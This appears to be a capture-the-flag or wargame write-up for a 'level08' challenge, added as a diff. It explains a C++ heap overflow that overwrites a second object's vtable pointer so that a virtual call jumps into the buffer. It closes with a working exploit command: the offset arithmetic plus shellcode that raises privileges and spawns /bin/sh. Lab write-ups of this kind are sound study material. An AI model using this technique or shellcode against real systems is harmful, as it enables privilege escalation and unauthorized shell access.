@@ -1,0 +1,23 @@
+- We have two dynamically allocated objects, with a virtual function, meaning they have a vtable pointer.
+- The vtable pointer is the first (pointer size) bytes of the object's location in memory, then come the member variables
+    - We can't overflow the buffer in our object, to override our own vtable, since the memory of the buffer comes  after (in lower memory) the vtable pointer
+
+- There are two objects however, and the overflow occurs in the first object, while we use the vtable of the second object to lookup the operator+ function location.
+- The second object is located in memory, somewhere lower (or after) the first object, since it was allocated second.
+- We should be able to overflow the buffer, corrupting the heap and reaching the begining of the second object (the location of the second object's vtable pointer!)
+- If we set that vtable pointer to a the location of our buffer, then when the operator+ is invoked, it will lookup the first vtable offset (since there is only one virtual function) and assume that value is a pointer to a function.
+
+- Knowing all this, we need to overflow and overwrite the vtable pointer of the second object to point to the begining of our buffer
+- The buffer needs to contain the 'function address' or rather, where our shell code begins as the first 4 bytes.  So the first four bytes of our buffer should be the location of the buffer + 4, then the rest of the buffer immedietly after is our shell code.
+
+- Offset bytes from object1's buffer to object2's vtable:
+    - [object2 vtable]0x0804a078 - [object1 buffer]0x804a00c  = 108
+
+So we write: (0x804a00c + 4) + (shell code) + (108 - bytes_written) + 0x804a00c
+
+the last value, will overwrite the vtable to the begining of our buffer
+the 'address' at the begining of our buffer, is the begining of our shell code
+
+- Final command!
+
+/levels/level08 `python -c "print '\x08\x04\xa0\x10'[::-1] + '\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\xbe\x2f\x2f\x73\x68\xc1\xee\x08\x56\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\x31\xc0\xb0\x0b\xcd\x80' + 'A'*62 + '\x08\x04\xa0\x0c'[::-1]"`
